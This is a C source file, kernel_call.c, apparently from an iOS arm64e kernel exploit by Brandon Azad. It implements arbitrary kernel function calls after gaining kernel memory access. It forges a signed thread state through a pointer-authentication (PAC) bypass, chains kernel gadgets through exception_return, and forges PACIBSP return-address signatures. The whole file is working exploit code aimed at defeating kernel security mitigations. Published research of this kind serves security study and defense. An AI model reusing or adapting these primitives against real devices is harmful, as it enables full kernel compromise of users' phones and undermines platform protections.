//
//  kernel_call.c
//  Brandon Azad
//
#include "kernel_call.h"

#include <assert.h>

#include "kernel.h"
#include "kernel_memory.h"
#include "pac_bypass.h"
#include "parameters.h"


// Whether the kernel_call system is currently initialized.
static bool initialized = false;

// The kernel page containing the forged thread state that was signed by the PAC bypass.
static uint64_t kernel_fake_state_page;

// The forged signature on the thread state.
static uint64_t kernel_fake_state_signature;

// The CPSR value we will use for normal code execution in the kernel.
#define KERNEL_CPSR		0x00400304

// The kernel CPSR with interrupts disabled.
#define KERNEL_CPSR_DAIF	0x004003c4

// Static asserts.
_Static_assert(sizeof(struct arm64e_context) == 0x350,
		"struct arm64e_context size should be 0x350");

// Call a kernel function using only the single forged signature produced by the PAC bypass.
// Supports up to 8 arguments and no return value. The function is called with interrupts disabled.
__attribute__((noinline))
static void
kernel_call_4(uint64_t function, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3) {
	// Find our thread, &thread->contextData, and thread->contextData.
	uint64_t thread = kernel_current_thread();
	uint64_t thread_contextData = thread + OFFSET(thread, contextData);
	uint64_t contextData = kernel_read64(thread_contextData);
	// For compactness, we'll only overwrite the state between x[0] and x[25]. No need to
	// overlap though.
	struct overwrite_state {
		uint64_t x[26];
	};
	size_t overwrite_offset = offsetof(struct arm64e_saved_state, x[0]);
	// Find the addresses of the kernel states.
	uint64_t kernel_state = kernel_fake_state_page + 0x4000 - 0x360;
	uint64_t kernel_state2 = kernel_state - sizeof(struct overwrite_state);
	uint64_t kernel_state3 = kernel_state2 - sizeof(struct overwrite_state);
	uint64_t kernel_sp = (kernel_state3 & ~0xf);
	// Build the user states.
	const size_t data_size = sizeof(struct overwrite_state) + sizeof(struct overwrite_state)
		+ sizeof(struct arm64e_saved_state);
	uint8_t data[data_size] = {};
	struct overwrite_state *state3 = (struct overwrite_state *) data;
	struct overwrite_state *state2 = (struct overwrite_state *) (state3 + 1);
	struct arm64e_saved_state *state1 = (struct arm64e_saved_state *) (state2 + 1);
	// Initialize EROP.
	state1->flavor = ARM_SAVED_STATE64;
	state1->pc    = ADDRESS(BR_X25);
	state1->cpsr  = KERNEL_CPSR_DAIF;
	state1->lr    = ADDRESS(exception_return);
	state1->x[16] = 0;
	state1->x[17] = 0;
	state1->pac_signature = kernel_fake_state_signature;
	state1->sp    = kernel_sp;
	state1->x[25] = ADDRESS(STR_X9_X3__STR_X8_X4__RET);
	state1->x[9]  = kernel_state + overwrite_offset;
	state1->x[3]  = kernel_state + offsetof(struct arm64e_saved_state, x[0]);
	state1->x[8]  = ADDRESS(memmove);
	state1->x[4]  = kernel_state + offsetof(struct arm64e_saved_state, x[25]);
	state1->x[21] = kernel_state;
	state1->x[1]  = kernel_state2;
	state1->x[2]  = sizeof(*state2);
	state2->x[25] = ADDRESS(STR_X9_X3__STR_X8_X4__RET);
	state2->x[9]  = contextData;
	state2->x[3]  = thread_contextData;
	state2->x[8]  = ADDRESS(memmove);
	state2->x[4]  = kernel_state + offsetof(struct arm64e_saved_state, x[25]);
	state2->x[21] = kernel_state;
	state2->x[0]  = kernel_state + overwrite_offset;
	state2->x[1]  = kernel_state3;
	state2->x[2]  = sizeof(*state3);
	state3->x[25] = function;
	state3->x[0]  = x0;
	state3->x[1]  = x1;
	state3->x[2]  = x2;
	state3->x[3]  = x3;
	state3->x[21] = contextData;
	// Compute the parameters for the state write.
	uint64_t write_dst = kernel_state3;
	void *write_src = (uint8_t *) state3;
	// Call ml_sign_thread_state().
	kernel_write(thread_contextData, &kernel_state, sizeof(uint64_t));
	kernel_write(write_dst, write_src, data_size);
	// The compiler should avoid using a tail call since we're passing the address of a stack
	// buffer.
}

// Execute an arbitrary kernel state. X16 and X17 cannot be controlled.
static void
kernel_exec(struct arm64e_saved_state *state) {
	uint64_t kernel_state = kernel_fake_state_page;
	kernel_write(kernel_state, state, sizeof(*state));
	// The call to exception_return__unsigned must have interrupts disabled. Entering
	// thread_exception_return/return_to_user with debug state may cause an infinite loop or
	// panic. This call assumes that sp points to a valid arm64e_context on entry to
	// exception_return__unsigned.
	kernel_call_4(ADDRESS(exception_return__unsigned),	// PC
			kernel_state,				// X0 = arm_context
			state->pc,				// X1 = ELR_EL1
			state->cpsr,				// X2 = SPSR_EL1
			state->lr);				// X3 = LR
}

// Generate a PACIBSP forgery. The memory around sp will be written to.
static uint64_t
pacibsp(uint64_t lr, uint64_t sp) {
	struct arm64e_saved_state pacibsp_state = {};
	pacibsp_state.pc = ADDRESS(pthread_returning_to_userspace);
	pacibsp_state.cpsr = KERNEL_CPSR_DAIF;
	pacibsp_state.sp = sp;
	pacibsp_state.lr = lr;
	kernel_exec(&pacibsp_state);
	return kernel_read64(sp - sizeof(uint64_t));
}

bool
kernel_call_init() {
	// Only initialize once.
	if (initialized) {
		return true;
	}
	// Initialize the PAC bypass parameters.
	bool ok = pac_bypass_parameters_init();
	if (!ok) {
		return false;
	}
	initialized = true;
	// Try to reuse state from a previous PAC bypass in kernel_all_image_info_addr.
	uint64_t kernel_pac_bypass_page_ptr = kernel_all_image_info_addr +
		offsetof(struct kernel_all_image_info_addr, kernel_pac_bypass_page);
	kernel_fake_state_page = kernel_read64(kernel_pac_bypass_page_ptr);
	uint64_t kernel_fake_state = kernel_fake_state_page + 0x4000 - 0x360;
	// If there was no previous PAC bypass, allocate state and bypass PAC.
	if (kernel_fake_state_page == 0) {
		// Allocate our kernel page.
		kernel_fake_state_page = kernel_vm_allocate(0x4000);
		// Sign the fake state at the end of the page. This is the only time we'll use the
		// PAC bypass primitive.
		kernel_fake_state = kernel_fake_state_page + 0x4000 - 0x360;
		pac_bypass__sign_thread_state(kernel_fake_state,	// State
				ADDRESS(BR_X25),			// PC
				KERNEL_CPSR_DAIF,			// CPSR
				ADDRESS(exception_return),		// LR
				0,					// X16
				0);					// X17
		// Set kernel_pac_bypass_page.
		kernel_write64(kernel_pac_bypass_page_ptr, kernel_fake_state_page);
	}
	// Grab the state signature.
	kernel_fake_state_signature = kernel_read64(kernel_fake_state +
			offsetof(struct arm64e_saved_state, pac_signature));
	// Initialize the saved state flavor.
	kernel_write32(kernel_fake_state + offsetof(struct arm64e_saved_state, flavor),
			ARM_SAVED_STATE64);
	return true;
}

uint64_t
kernel_call_8(uint64_t function,
		uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
		uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
	assert(initialized);
	uint64_t stack[4] = {};
	uint64_t kernel_sp = kernel_fake_state_page + 0x4000 - 0x600 - sizeof(stack);
	struct arm64e_saved_state call_state = {};
	call_state.pc = function;
	call_state.cpsr = KERNEL_CPSR;
	call_state.x[0] = x0;
	call_state.x[1] = x1;
	call_state.x[2] = x2;
	call_state.x[3] = x3;
	call_state.x[4] = x4;
	call_state.x[5] = x5;
	call_state.x[6] = x6;
	call_state.x[7] = x7;
	call_state.sp = kernel_sp;
	call_state.lr = ADDRESS(STR_X0_X20__LDP_X29_X30_SP_10__RETAB);
	call_state.x[20] = kernel_fake_state_page;
	stack[3] = pacibsp(ADDRESS(thread_exception_return), kernel_sp + sizeof(stack));
	kernel_write(kernel_sp, stack, sizeof(stack));
	kernel_exec(&call_state);
	return kernel_read64(kernel_fake_state_page);
}
